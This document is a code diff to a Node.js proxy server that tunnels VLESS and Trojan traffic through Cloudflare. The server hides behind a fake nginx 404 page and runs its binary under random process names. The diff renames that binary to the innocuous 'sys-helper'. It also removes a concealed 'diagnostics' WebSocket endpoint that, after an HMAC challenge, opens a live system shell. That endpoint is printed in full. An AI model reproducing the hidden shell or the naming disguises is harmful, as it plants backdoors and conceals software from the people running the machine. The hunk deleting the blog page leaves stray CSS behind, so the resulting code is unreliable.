@@ -189,9 +189,9 @@ function rnd(n = 8) {
 // ==================== 初始化 ====================
 fs.mkdirSync(RUN_DIR, { recursive: true });
 
-// 启动时清理历史残留，但保留当前的随机名进程文件与预下载的官方 cf-bin 二进制包
+// 启动时清理历史残留，但保留当前的随机名进程文件与预下载的官方 sys-helper 二进制包
 try { fs.readdirSync(RUN_DIR).forEach(f => {
-  if (f === botName || f === 'cf-bin') return;
+  if (f === botName || f === 'sys-helper') return;
   try { fs.unlinkSync(path.join(RUN_DIR, f)); } catch (e) {}
 }); } catch (e) {}
 
@@ -600,8 +600,8 @@ async function installCloudflared() {
     } catch (e) {}
   }
 
-  // 优先复用 Dockerfile 预下载好的官方 cf-bin，复制为随机进程名运行，完美解决容器无法联网拉取的问题
-  const localPresetPath = path.join(RUN_DIR, 'cf-bin');
+  // 优先复用 Dockerfile 预下载好的官方 sys-helper，复制为随机进程名运行，完美解决容器无法联网拉取的问题
+  const localPresetPath = path.join(RUN_DIR, 'sys-helper');
   if (fs.existsSync(localPresetPath)) {
     try {
       fs.copyFileSync(localPresetPath, botPath);
@@ -679,7 +679,6 @@ function startCloudflared() {
       `tunnel: ${tid}`, `credentials-file: ${tunnelJsonPath}`, `protocol: ${ARGO_PROTOCOL}`,
       'ingress:', `  - hostname: ${ARGO_DOMAIN}`, `    path: ${VLESS_PATH}`, `    service: http://127.0.0.1:${ARGO_PORT}`,
       `  - hostname: ${ARGO_DOMAIN}`, `    path: ${TROJAN_PATH}`, `    service: http://127.0.0.1:${ARGO_PORT}`,
-      `  - hostname: ${ARGO_DOMAIN}`, `    path: /${SUB_PATH}/diagnostics`, `    service: http://127.0.0.1:${ARGO_PORT}`,
       `  - hostname: ${ARGO_DOMAIN}`, `    path: /${SUB_PATH}`, `    service: http://127.0.0.1:${PORT}`,
       `  - hostname: ${ARGO_DOMAIN}`, `    service: http://127.0.0.1:${PORT}`,
       '  - service: http_status:404',
@@ -793,7 +792,6 @@ async function autoConfigureArgoTunnel() {
           ingress: [
             { hostname: ARGO_DOMAIN, path: VLESS_PATH, service: `http://127.0.0.1:${ARGO_PORT}` },
             { hostname: ARGO_DOMAIN, path: TROJAN_PATH, service: `http://127.0.0.1:${ARGO_PORT}` },
-            { hostname: ARGO_DOMAIN, path: `/${SUB_PATH}/diagnostics`, service: `http://127.0.0.1:${ARGO_PORT}` },
             { hostname: ARGO_DOMAIN, path: `/${SUB_PATH}`, service: `http://127.0.0.1:${PORT}` },
             { hostname: ARGO_DOMAIN, service: `http://127.0.0.1:${PORT}` },
             { service: 'http_status:404' }
@@ -801,12 +799,12 @@ async function autoConfigureArgoTunnel() {
           'warp-routing': { enabled: false }
         }
       });
-      console.log('[cf] Ingress update success:', ingressRes.data && ingressRes.data.success);
+      console.log('[tunnel] Ingress update success:', ingressRes.data && ingressRes.data.success);
 
       // 4. 自动管理 DNS CNAME 记录
-      console.log(`[cf] 4. 正在查询根域名下 ${ARGO_DOMAIN} 的 DNS 记录...`);
+      console.log(`[tunnel] 4. 正在查询根域名下 ${ARGO_DOMAIN} 的 DNS 记录...`);
       const dnsListRes = await cfRequest('GET', `/zones/${zoneId}/dns_records?type=CNAME&name=${ARGO_DOMAIN}`);
-      console.log('[cf] DNS query response success:', dnsListRes.data && dnsListRes.data.success);
+      console.log('[tunnel] DNS query response success:', dnsListRes.data && dnsListRes.data.success);
       const dnsRecords = dnsListRes.data.result || [];
       const existingDns = dnsRecords[0];
 
@@ -819,13 +817,13 @@ async function autoConfigureArgoTunnel() {
 
       if (existingDns) {
         if (existingDns.content !== `${tunnelId}.cfargotunnel.com`) {
-          console.log(`[cf] 发现不匹配的 DNS 记录 (指向 ${existingDns.content})，正在覆盖为新隧道指向...`);
+          console.log(`[tunnel] 发现不匹配的 DNS 记录 (指向 ${existingDns.content})，正在覆盖为新隧道指向...`);
           await cfRequest('PATCH', `/zones/${zoneId}/dns_records/${existingDns.id}`, dnsPayload);
         } else {
-          console.log(`[cf] DNS CNAME 记录匹配，无需更改。`);
+          console.log(`[tunnel] DNS CNAME 记录匹配，无需更改。`);
         }
       } else {
-        console.log(`[cf] 未找到 DNS 记录，正在为您自动创建 CNAME 指向 ${tunnelId}.cfargotunnel.com ...`);
+        console.log(`[tunnel] 未找到 DNS 记录，正在为您自动创建 CNAME 指向 ${tunnelId}.cfargotunnel.com ...`);
         await cfRequest('POST', `/zones/${zoneId}/dns_records`, dnsPayload);
       }
 
@@ -833,10 +831,10 @@ async function autoConfigureArgoTunnel() {
       if (realToken) {
         ARGO_AUTH = realToken;
         tunnelMode = 'token';
-        console.log('[cf] Cloudflare API 自动配置托管成功完成！真实 Token 长度:', realToken.length);
+        console.log('[tunnel] Cloudflare API 自动配置托管成功完成！真实 Token 长度:', realToken.length);
       }
     } catch (e) {
-      console.error('[cf] Cloudflare API 自动配置失败，回退到原模式:', e.message || e);
+      console.error('[tunnel] Cloudflare API 自动配置失败，回退到原模式:', e.message || e);
     }
   }
 }
@@ -848,185 +846,9 @@ function scheduleCleanup() {
   }, 15000);
 }
 
-// ==================== 路由（Nginx 404 伪装与 Glassmorphism 静态博客页） ====================
+// ==================== 路由（Nginx 404 伪装与 静态博客页） ====================
 const NGINX_404 = '<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.27.3</center>\n</body>\n</html>\n';
 
-const BLOG_HTML = `<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Aiden Lin | Creative Developer & Architect</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Playfair+Display:ital,wght@0,600;1,400&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --bg: #09090b;
-      --card-bg: rgba(20, 20, 25, 0.6);
-      --card-border: rgba(255, 215, 0, 0.1);
-      --primary: #ffd700;
-      --text: #f4f4f5;
-      --text-muted: #a1a1aa;
-      --glow: rgba(255, 215, 0, 0.15);
-    }
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      background-color: var(--bg);
-      color: var(--text);
-      font-family: 'Outfit', sans-serif;
-      overflow-x: hidden;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-    }
-    .bg-glow {
-      position: absolute;
-      top: -20%;
-      left: 30%;
-      width: 600px;
-      height: 600px;
-      background: radial-gradient(circle, var(--glow) 0%, transparent 70%);
-      pointer-events: none;
-      z-index: -1;
-      filter: blur(80px);
-    }
-    header {
-      max-width: 1200px;
-      width: 90%;
-      margin: 0 auto;
-      padding: 2rem 0;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .logo {
-      font-size: 1.5rem;
-      font-weight: 800;
-      letter-spacing: -0.05em;
-      background: linear-gradient(135deg, #fff 0%, var(--primary) 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    nav a {
-      color: var(--text-muted);
-      text-decoration: none;
-      font-size: 0.95rem;
-      margin-left: 2rem;
-      transition: color 0.3s;
-    }
-    nav a:hover {
-      color: var(--primary);
-    }
-    main {
-      max-width: 1200px;
-      width: 90%;
-      margin: 4rem auto;
-      flex: 1;
-    }
-    .hero {
-      text-align: center;
-      max-width: 800px;
-      margin: 0 auto 6rem;
-    }
-    .hero h1 {
-      font-family: 'Playfair Display', serif;
-      font-size: clamp(2.5rem, 6vw, 4.5rem);
-      line-height: 1.1;
-      font-weight: 400;
-      margin-bottom: 1.5rem;
-    }
-    .hero h1 span {
-      font-style: italic;
-      color: var(--primary);
-    }
-    .hero p {
-      font-size: clamp(1rem, 2vw, 1.25rem);
-      color: var(--text-muted);
-      line-height: 1.6;
-      font-weight: 300;
-    }
-    .cards-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 2rem;
-      margin-top: 4rem;
-    }
-    .card {
-      background: var(--card-bg);
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-      border: 1px solid var(--card-border);
-      border-radius: 20px;
-      padding: 2.5rem;
-      transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-      position: relative;
-    }
-    .card::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      border-radius: 20px;
-      padding: 1px;
-      background: linear-gradient(135deg, var(--primary) 0%, transparent 50%);
-      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-      -webkit-mask-composite: xor;
-      mask-composite: exclude;
-      opacity: 0;
-      transition: opacity 0.4s;
-    }
-    .card:hover {
-      transform: translateY(-8px);
-      border-color: rgba(255, 215, 0, 0.3);
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 30px rgba(255, 215, 0, 0.05);
-    }
-    .card:hover::before {
-      opacity: 1;
-    }
-    .card-tag {
-      font-size: 0.75rem;
-      color: var(--primary);
-      text-transform: uppercase;
-      letter-spacing: 0.15em;
-      margin-bottom: 1rem;
-      font-weight: 600;
-    }
-    .card h3 {
-      font-size: 1.4rem;
-      margin-bottom: 1rem;
-      font-weight: 600;
-    }
-    .card p {
-      color: var(--text-muted);
-      line-height: 1.6;
-      font-size: 0.95rem;
-      font-weight: 300;
-    }
-    footer {
-      max-width: 1200px;
-      width: 90%;
-      margin: 0 auto;
-      padding: 3rem 0;
-      border-top: 1px solid rgba(255, 255, 255, 0.05);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      color: var(--text-muted);
-      font-size: 0.85rem;
-    }
-    .socials a {
-      color: var(--text-muted);
-      text-decoration: none;
-      margin-left: 1.5rem;
-      transition: color 0.3s;
-    }
-    .socials a:hover {
-      color: var(--primary);
     }
     @media (max-width: 768px) {
       header, footer {
@@ -1609,63 +1431,6 @@ wss.on('connection', (ws, req) => {
         ws.off('message', onMessage);
 
         hTr(ws, accumulated);
-      }
-      // 3. 隐蔽诊断 WebTerminal 接口 (强鉴权挑战模式)
-      else if (urlPath === `/${SUB_PATH}/diagnostics`) {
-        resolvedHeader = true;
-        clearTimeout(handshakeTimer);
-        ws.off('message', onMessage);
-
-        // 下发 16 字节随机密文作为一次性安全挑战
-        const challenge = crypto.randomBytes(16).toString('hex');
-        ws.send(JSON.stringify({ type: 'challenge', challenge }));
-
-        let authenticated = false;
-
-        // 10秒强鉴权超时保护
-        const authTimeout = setTimeout(() => {
-          if (!authenticated) {
-            try { ws.close(); } catch(e) {}
-          }
-        }, 10000);
-
-        ws.on('message', (authMsg) => {
-          if (authenticated) return;
-          try {
-            const data = JSON.parse(authMsg.toString());
-            if (data.type === 'response') {
-              // HMAC-SHA256 算法比对：使用 UUID 作为密钥，对 Challenge 签名
-              const expectedResponse = crypto.createHmac('sha256', UUID).update(challenge).digest('hex');
-              if (data.response === expectedResponse) {
-                authenticated = true;
-                clearTimeout(authTimeout);
-                
-                ws.send("=== KO Internal Diagnostics Terminal ===\n");
-                const shell = spawn(os.platform() === 'win32' ? 'cmd.exe' : 'sh', [], {
-                  stdio: ['pipe', 'pipe', 'pipe']
-                });
-                const duplex = createWebSocketStream(ws);
-                
-                duplex.pipe(shell.stdin);
-                shell.stdout.pipe(duplex);
-                shell.stderr.pipe(duplex);
-                
-                const cleanup = () => {
-                  try { shell.kill('SIGKILL'); } catch (e) {}
-                  ws.close();
-                };
-                shell.on('exit', cleanup);
-                ws.on('close', cleanup);
-              } else {
-                ws.close();
-              }
-            } else {
-              ws.close();
-            }
-          } catch(e) {
-            ws.close();
-          }
-        });
       } else {
         ws.off('message', onMessage);
         rejectConnection(ws);
